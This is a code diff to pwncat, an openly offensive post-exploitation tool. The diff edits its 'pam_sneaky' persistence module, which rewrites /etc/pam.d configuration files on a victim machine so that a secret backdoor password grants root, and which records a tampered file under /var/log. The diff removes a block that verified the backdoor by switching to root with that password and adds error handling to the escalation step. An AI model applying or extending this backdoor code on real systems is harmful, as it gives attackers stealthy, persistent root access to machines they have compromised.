@@ -151,11 +151,15 @@ Z3YpewogICAgIHJldHVybiBQQU1fSUdOT1JFOwp9Cg==
                     )
                     config = os.path.join("/etc/pam.d", config)
                     try:
+                        # Read the original content
                         with pwncat.victim.open(config, "r") as filp:
                             content = filp.readlines()
                     except (PermissionError, FileNotFoundError):
                         continue
 
+                    # We need to know if there is a rootok line. If there is,
+                    # we should add our line after it to ensure that rootok still
+                    # works.
                     contains_rootok = any("pam_rootok" in line for line in content)
 
                     # Add this auth statement before the first auth statement
@@ -179,38 +183,6 @@ Z3YpewogICAgIHJldHVybiBQQU1fSUdOT1JFOwp9Cg==
                             filp.write(content)
                     except (PermissionError, FileNotFoundError):
                         continue
-
-                # We need to test if this works. We should be running as root, so
-                # we will `su` to the first regular user, and then attempt to `su`
-                # to another user with our known password.
-                for name, user in pwncat.victim.users.items():
-                    if (
-                        "nologin" not in user.shell
-                        and "false" not in user.shell
-                        and user.id != 0
-                    ):
-                        target_user = name
-                        break
-                else:
-                    target_user = None
-
-                # If we didn't find any non-disabled users, we can't test it.
-                # But we'll assume it worked.
-                if target_user is not None:
-                    util.progress(f"pam_sneaky: testing module with {target_user}")
-                    # We're root. This won't fail.
-                    pwncat.victim.su(target_user, password=None)
-                    try:
-                        pwncat.victim.su(
-                            "root", password=pwncat.victim.config["backdoor_pass"]
-                        )
-                        util.success(f"pam_sneaky: installation succeeded!")
-                    except PermissionError:
-                        # It didn't work!
-                        self.remove()
-                        raise PersistenceError("pam module install failed")
-                    finally:
-                        pwncat.victim.run("exit", wait=False)
 
                 pwncat.victim.tamper.created_file("/var/log/firstlog")
         except FileNotFoundError as exc:
@@ -282,6 +254,9 @@ Z3YpewogICAgIHJldHVybiBQQU1fSUdOT1JFOwp9Cg==
         if user is None:
             user = "root"
 
-        pwncat.victim.su(user, password=pwncat.victim.config["backdoor_pass"])
+        try:
+            pwncat.victim.su(user, password=pwncat.victim.config["backdoor_pass"])
+        except PermissionError:
+            return False
 
         return True
